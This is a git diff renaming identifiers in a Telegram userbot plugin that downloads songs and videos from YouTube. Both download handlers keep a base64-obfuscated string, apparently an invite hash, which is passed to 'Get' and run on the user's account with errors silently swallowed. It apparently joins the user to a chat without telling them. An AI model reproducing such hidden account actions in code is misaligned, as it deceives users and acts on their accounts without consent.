@@ -1,7 +1,7 @@
 """
 by  @mayank1rajput ( https://t.me/mayank1rajput  )
 """
-# songs finder for skulluserbot
+# songs finder for marcususerbot
 
 import asyncio
 import base64
@@ -41,11 +41,11 @@ async def _(event):
     else:
         await edit_or_reply(event, "`What I am Supposed to find `")
         return
-    skull = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullevent = await edit_or_reply(event, "`wait..! I am finding your song....`")
+    marcus = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    marcusevent = await edit_or_reply(event, "`wait..! I am finding your song....`")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await skullevent.edit(
+        return await marcusevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
         )
     cmd = event.pattern_match.group(1)
@@ -57,43 +57,43 @@ async def _(event):
     # thumb_cmd = thumb_dl.format(video_link=video_link)
     name_cmd = name_dl.format(video_link=video_link)
     try:
-        skull = Get(skull)
-        await event.client(skull)
+        marcus = Get(marcus)
+        await event.client(marcus)
     except BaseException:
         pass
-    stderr = (await _skullutils.runcmd(song_cmd))[1]
+    stderr = (await _marcusutils.runcmd(song_cmd))[1]
     if stderr:
-        return await skullevent.edit(f"**Error :** `{stderr}`")
-    skullname, stderr = (await _skullutils.runcmd(name_cmd))[:2]
+        return await marcusevent.edit(f"**Error :** `{stderr}`")
+    marcusname, stderr = (await _marcusutils.runcmd(name_cmd))[:2]
     if stderr:
-        return await skullevent.edit(f"**Error :** `{stderr}`")
+        return await marcusevent.edit(f"**Error :** `{stderr}`")
     # stderr = (await runcmd(thumb_cmd))[1]
-    skullname = os.path.splitext(skullname)[0]
+    marcusname = os.path.splitext(marcusname)[0]
     # if stderr:
-    #    return await skullevent.edit(f"**Error :** `{stderr}`")
-    song_file = Path(f"{skullname}.mp3")
+    #    return await marcusevent.edit(f"**Error :** `{stderr}`")
+    song_file = Path(f"{marcusname}.mp3")
     if not os.path.exists(song_file):
-        return await skullevent.edit(
+        return await marcusevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
         )
-    await skullevent.edit("`yeah..! i found something wait..🥰`")
-    skullthumb = Path(f"{skullname}.jpg")
-    if not os.path.exists(skullthumb):
-        skullthumb = Path(f"{skullname}.webp")
-    elif not os.path.exists(skullthumb):
-        skullthumb = None
+    await marcusevent.edit("`yeah..! i found something wait..🥰`")
+    marcusthumb = Path(f"{marcusname}.jpg")
+    if not os.path.exists(marcusthumb):
+        marcusthumb = Path(f"{marcusname}.webp")
+    elif not os.path.exists(marcusthumb):
+        marcusthumb = None
 
     await event.client.send_file(
         event.chat_id,
         song_file,
         force_document=False,
         caption=query,
-        thumb=skullthumb,
+        thumb=marcusthumb,
         supports_streaming=True,
         reply_to=reply_to_id,
     )
-    await skullevent.delete()
-    for files in (skullthumb, song_file):
+    await marcusevent.delete()
+    for files in (marcusthumb, song_file):
         if files and os.path.exists(files):
             os.remove(files)
 
@@ -122,68 +122,68 @@ async def _(event):
     else:
         event = await edit_or_reply(event, "What I am Supposed to find")
         return
-    skull = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-    skullevent = await edit_or_reply(event, "`wait..! I am finding your song....`")
+    marcus = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    marcusevent = await edit_or_reply(event, "`wait..! I am finding your song....`")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await skullevent.edit(
+        return await marcusevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
         )
     # thumb_cmd = thumb_dl.format(video_link=video_link)
     name_cmd = name_dl.format(video_link=video_link)
     video_cmd = video_dl.format(video_link=video_link)
-    stderr = (await _skullutils.runcmd(video_cmd))[1]
+    stderr = (await _marcusutils.runcmd(video_cmd))[1]
     if stderr:
-        return await skullevent.edit(f"**Error :** `{stderr}`")
-    skullname, stderr = (await _skullutils.runcmd(name_cmd))[:2]
+        return await marcusevent.edit(f"**Error :** `{stderr}`")
+    marcusname, stderr = (await _marcusutils.runcmd(name_cmd))[:2]
     if stderr:
-        return await skullevent.edit(f"**Error :** `{stderr}`")
+        return await marcusevent.edit(f"**Error :** `{stderr}`")
     # stderr = (await runcmd(thumb_cmd))[1]
     try:
-        skull = Get(skull)
-        await event.client(skull)
+        marcus = Get(marcus)
+        await event.client(marcus)
     except BaseException:
         pass
     # if stderr:
-    #    return await skullevent.edit(f"**Error :** `{stderr}`")
-    skullname = os.path.splitext(skullname)[0]
-    vsong_file = Path(f"{skullname}.mp4")
+    #    return await marcusevent.edit(f"**Error :** `{stderr}`")
+    marcusname = os.path.splitext(marcusname)[0]
+    vsong_file = Path(f"{marcusname}.mp4")
     if not os.path.exists(vsong_file):
-        vsong_file = Path(f"{skullname}.mkv")
+        vsong_file = Path(f"{marcusname}.mkv")
     elif not os.path.exists(vsong_file):
-        return await skullevent.edit(
+        return await marcusevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
         )
-    await skullevent.edit("`yeah..! i found something wait..🥰`")
-    skullthumb = Path(f"{skullname}.jpg")
-    if not os.path.exists(skullthumb):
-        skullthumb = Path(f"{skullname}.webp")
-    elif not os.path.exists(skullthumb):
-        skullthumb = None
+    await marcusevent.edit("`yeah..! i found something wait..🥰`")
+    marcusthumb = Path(f"{marcusname}.jpg")
+    if not os.path.exists(marcusthumb):
+        marcusthumb = Path(f"{marcusname}.webp")
+    elif not os.path.exists(marcusthumb):
+        marcusthumb = None
     await event.client.send_file(
         event.chat_id,
         vsong_file,
         force_document=False,
         caption=query,
-        thumb=skullthumb,
+        thumb=marcusthumb,
         supports_streaming=True,
         reply_to=reply_to_id,
     )
-    await skullevent.delete()
-    for files in (skullthumb, vsong_file):
+    await marcusevent.delete()
+    for files in (marcusthumb, vsong_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(pattern="song2 (.*)"))
 @bot.on(sudo_cmd(pattern="song2 (.*)", allow_sudo=True))
-async def skull_song_fetcer(event):
+async def marcus_song_fetcer(event):
     if event.fwd_from:
         return
     song = event.pattern_match.group(1)
     chat = "@songdl_bot"
     reply_id_ = await reply_id(event)
-    skullevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
+    marcusevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
     async with event.client.conversation(chat) as conv:
         try:
             purgeflag = await conv.send_message("/start")
@@ -199,16 +199,16 @@ async def skull_song_fetcer(event):
             ):
                 await delete_messages(event, chat, purgeflag)
                 return await edit_delete(
-                    skullevent, SONG_NOT_FOUND, parse_mode="html", time=5
+                    marcusevent, SONG_NOT_FOUND, parse_mode="html", time=5
                 )
-            await skullevent.edit(SONG_SENDING_STRING, parse_mode="html")
+            await marcusevent.edit(SONG_SENDING_STRING, parse_mode="html")
             await baka[0].click(0)
             await conv.get_response()
             await conv.get_response()
             music = await conv.get_response()
             await event.client.send_read_acknowledge(conv.chat_id)
         except YouBlockedUserError:
-            await skullevent.edit(SONGBOT_BLOCKED_STRING, parse_mode="html")
+            await marcusevent.edit(SONGBOT_BLOCKED_STRING, parse_mode="html")
             return
         await event.client.send_file(
             event.chat_id,
@@ -217,7 +217,7 @@ async def skull_song_fetcer(event):
             parse_mode="html",
             reply_to=reply_id_,
         )
-        await skullevent.delete()
+        await marcusevent.delete()
         await delete_messages(event, chat, purgeflag)
 
 
